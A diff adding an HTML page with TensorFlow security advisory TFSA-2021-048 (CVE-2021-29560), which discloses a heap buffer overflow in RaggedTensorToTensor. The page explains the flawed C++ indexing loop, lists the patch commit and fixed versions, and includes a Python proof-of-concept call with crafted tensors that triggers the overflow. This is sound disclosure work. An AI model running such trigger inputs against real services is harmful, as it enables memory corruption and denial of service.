@@ -1,0 +1,54 @@
+<h2>TFSA-2021-048: Heap buffer overflow in <code>RaggedTensorToTensor</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29560</p>
+<h3>Impact</h3>
+<p>An attacker can cause a heap buffer overflow in
+<code>tf.raw_ops.RaggedTensorToTensor</code>:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>shape = tf.constant([10, 10], shape=[2], dtype=tf.int64)
+values = tf.constant(0, shape=[1], dtype=tf.int64)
+default_value = tf.constant(0, dtype=tf.int64)
+l = [849, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+row = tf.constant(l, shape=[5, 43], dtype=tf.int64)
+rows = [row]
+types = ['ROW_SPLITS']</p>
+<p>tf.raw_ops.RaggedTensorToTensor(
+    shape=shape, values=values, default_value=default_value,
+    row_partition_tensors=rows, row_partition_types=types)
+```</p>
+<p>This is because the
+<a href="https://github.com/tensorflow/tensorflow/blob/d94227d43aa125ad8b54115c03cece54f6a1977b/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L219-L222">implementation</a>
+uses the same index to access two arrays in parallel:</p>
+<p><code>cc
+for (INDEX_TYPE i = 0; i &lt; row_split_size - 1; ++i) {
+  INDEX_TYPE row_length = row_split(i + 1) - row_split(i);
+  INDEX_TYPE real_length = std::min(output_size, row_length);
+  INDEX_TYPE parent_output_index_current = parent_output_index[i];
+  ...
+}</code></p>
+<p>Since the user controls the shape of the input arguments, an attacker could
+trigger a heap OOB access when <code>parent_output_index</code> is shorter than
+<code>row_split</code>.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/a84358aa12f0b1518e606095ab9cfddbf597c121">a84358aa12f0b1518e606095ab9cfddbf597c121</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu
+X-Team.</p>
